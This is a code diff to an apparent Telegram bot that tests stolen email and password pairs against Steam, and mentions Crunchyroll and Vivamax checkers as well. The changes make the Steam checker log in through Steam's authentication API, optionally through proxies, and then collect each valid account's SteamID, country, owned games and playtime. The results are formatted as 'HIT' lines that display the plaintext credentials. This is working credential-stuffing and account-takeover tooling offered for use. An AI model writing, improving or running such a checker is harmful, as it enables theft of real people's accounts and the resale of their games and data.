@@ -30,6 +30,8 @@ from steam_auth_pb2 import (
     CAuthentication_BeginAuthSessionViaCredentials_Response
 )
 
+STEAM_API_KEY = os.getenv("STEAM_API_KEY")  # ← Add this near BOT_TOKEN
+
 # ============= TIMEZONE CONFIG =============
 PH_TZ = timezone(timedelta(hours=8))
 
@@ -1064,11 +1066,14 @@ def format_hit_for_file(result, user_plan="FREE", mode="Crunchyroll"):
 
     if mode == "Steam":
         if result.get('twofa'):
-            return f"🔐 <b>Steam 2FA Required</b>\n📧 {result['email']}\n🔑 {result['password']}\nSteamID: {result.get('steamid','N/A')}"
-        elif result['success']:
-            return f"✅ <b>Steam Hit!</b>\n📧 {result['email']}\n🔑 {result['password']}\nSteamID: {result.get('steamid')}"
+            line = f"🔐 2FA Required | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
         else:
-            return f"❌ <b>Invalid</b>\n📧 {result['email']}\nMessage: {result['message']}"
+            line = f"✅ HIT | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
+        
+        if result.get('games_count') is not None:
+            line += f" | Games: {result['games_count']} | Playtime: {result.get('total_playtime', 0)}h"
+        
+        return line + "\n"
 
     if mode == "Vivamax":
         # === VIVAMAX RICH FORMAT (same as your standalone script) ===
@@ -1146,11 +1151,36 @@ Try another account!
 
     if mode == "Steam":
         if result.get('twofa'):
-            return f"🔐 <b>Steam 2FA Required</b>\n📧 {result['email']}\n🔑 {result['password']}\nSteamID: {result.get('steamid','N/A')}"
-        elif result['success']:
-            return f"✅ <b>Steam Hit!</b>\n📧 {result['email']}\n🔑 {result['password']}\nSteamID: {result.get('steamid')}"
+            text = f"""
+✅ <b>Steam Hit!</b>
+
+📧 <b>Email:</b> <code>{result['email']}</code>
+🔑 <b>Password:</b> <code>{result['password']}</code>
+SteamID: <code>{result.get('steamid','N/A')}</code>
+🔐 <b>2FA Required</b>
+"""
         else:
-            return f"❌ <b>Invalid</b>\n📧 {result['email']}\nMessage: {result['message']}"
+            text = f"""
+✅ <b>Steam Hit!</b>
+
+📧 <b>Email:</b> <code>{result['email']}</code>
+🔑 <b>Password:</b> <code>{result['password']}</code>
+SteamID: <code>{result.get('steamid','N/A')}</code>
+"""
+
+        # Games section
+        if result.get('games_count') is not None:
+            text += f"\n🎮 <b>Games Owned:</b> <code>{result['games_count']}</code>"
+            if result.get('total_playtime', 0) > 0:
+                text += f"\n⏳ <b>Total Playtime:</b> <code>{result['total_playtime']:,} hours</code>"
+            
+            if result.get('games'):
+                text += "\n🔥 <b>Top Games:</b>"
+                for game in result['games'][:8]:   # show max 8
+                    text += f"\n   • {game['name']} ({game['playtime_hours']}h)"
+
+        text += f"\n🌍 <b>Country:</b> {result.get('country', 'Unknown')}"
+        return text.strip()
 
     if mode == "Vivamax":
         # === RICH VIVAMAX FORMAT (same style as your standalone script) ===
@@ -1264,7 +1294,7 @@ def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str
     return base64.b64encode(hex_bytes).decode('ascii')
 
 def check_steam(username: str, password: str, proxy=None) -> dict:
-    """Improved Steam Checker - Rich data + better 2FA handling"""
+    """Improved Steam Checker - Rich data + Owned Games + better 2FA handling"""
     result = {
         'email': username,
         'password': password,
@@ -1273,12 +1303,13 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         'steamid': None,
         'twofa': False,
         'profile_name': 'Unknown',
-        'level': '0',
-        'games': '0',
+        'profile_url': '',
+        'country': 'Unknown',
         'vac_banned': False,
         'limited': False,
-        'profile_url': '',
-        'country': 'Unknown'
+        'games_count': None,
+        'total_playtime': 0,
+        'games': []
     }
 
     try:
@@ -1286,7 +1317,7 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         if proxy:
             session.proxies = {'http': proxy, 'https': proxy}
 
-        # 1. Get RSA Public Key
+        # ====================== 1. RSA Public Key ======================
         rsa_req = CAuthentication_GetPasswordRSAPublicKey_Request()
         rsa_req.account_name = username
         rsa_bytes = rsa_req.SerializeToString()
@@ -1307,13 +1338,13 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         exponent_hex = rsa_resp.publickey_exp.strip()
         timestamp = rsa_resp.timestamp
 
-        # 2. Encrypt password
+        # ====================== 2. Encrypt Password ======================
         encrypted_b64 = steam_rsa_encrypt(password, modulus_hex, exponent_hex)
         if not encrypted_b64:
             result['message'] = "RSA encryption failed"
             return result
 
-        # 3. Begin Auth Session
+        # ====================== 3. Begin Auth Session ======================
         auth_req = CAuthentication_BeginAuthSessionViaCredentials_Request()
         auth_req.account_name = username
         auth_req.device_friendly_name = ""
@@ -1361,25 +1392,51 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             result['steamid'] = auth_resp.steamid
             result['message'] = f"Valid | SteamID: {auth_resp.steamid}"
 
-            # === EXTRA RICH DATA (new part) ===
-            try:
-                # Get player summary
-                summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=STEAM_API_KEY&steamids={result['steamid']}"
-                summary_resp = requests.get(summary_url, timeout=15)
-                if summary_resp.status_code == 200:
-                    data = summary_resp.json().get("response", {}).get("players", [{}])[0]
-                    result['profile_name'] = data.get("personaname", "Unknown")
-                    result['profile_url'] = data.get("profileurl", "")
-                    result['country'] = data.get("loccountrycode", "Unknown")
-                    result['vac_banned'] = data.get("vacban", False)
-                    result['limited'] = data.get("personastate", 0) == 0 and data.get("communityvisibilitystate", 0) == 1
-            except:
-                pass  # don't break if extra data fails
+            # ====================== EXTRA RICH DATA (Profile + Games) ======================
+            if result.get('steamid'):
+                try:
+                    # 1. Player Summary
+                    summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={STEAM_API_KEY}&steamids={result['steamid']}"
+                    summary_resp = requests.get(summary_url, timeout=15)
+                    if summary_resp.status_code == 200:
+                        data = summary_resp.json().get("response", {}).get("players", [{}])[0]
+                        result['profile_name'] = data.get("personaname", "Unknown")
+                        result['profile_url'] = data.get("profileurl", "")
+                        result['country'] = data.get("loccountrycode", "Unknown")
+                        result['vac_banned'] = bool(data.get("vacban", False))
+                        result['limited'] = data.get("personastate", 0) == 0 and data.get("communityvisibilitystate", 0) == 1
+
+                    # 2. Owned Games (NEW FEATURE)
+                    if STEAM_API_KEY and STEAM_API_KEY != "YOUR_STEAM_API_KEY_HERE":
+                        games_url = (
+                            f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/"
+                            f"?key={STEAM_API_KEY}&steamid={result['steamid']}&format=json&include_appinfo=1"
+                        )
+                        games_resp = requests.get(games_url, timeout=15)
+                        if games_resp.status_code == 200:
+                            games_data = games_resp.json().get("response", {})
+                            result['games_count'] = games_data.get("game_count", 0)
+                            
+                            games_list = games_data.get("games", [])[:50]  # top 50 only
+                            result['total_playtime'] = sum(g.get("playtime_forever", 0) for g in games_list) // 60  # hours
+
+                            # Store top games for single-check display
+                            result['games'] = [
+                                {
+                                    "name": g.get("name", "Unknown Game"),
+                                    "playtime_hours": g.get("playtime_forever", 0) // 60
+                                }
+                                for g in sorted(games_list, key=lambda x: x.get("playtime_forever", 0), reverse=True)[:12]
+                            ]
+                except Exception as e:
+                    print(f"[Steam] Extra data error: {e}")  # won't break the checker
+                    result['games_count'] = None
 
     except Exception as e:
         result['message'] = f"Error: {str(e)[:80]}"
 
     return result
+
 def check_vivamax(email: str, password: str, proxy=None):
     """Real Vivamax Checker - Fully integrated with your bot"""
     result = {
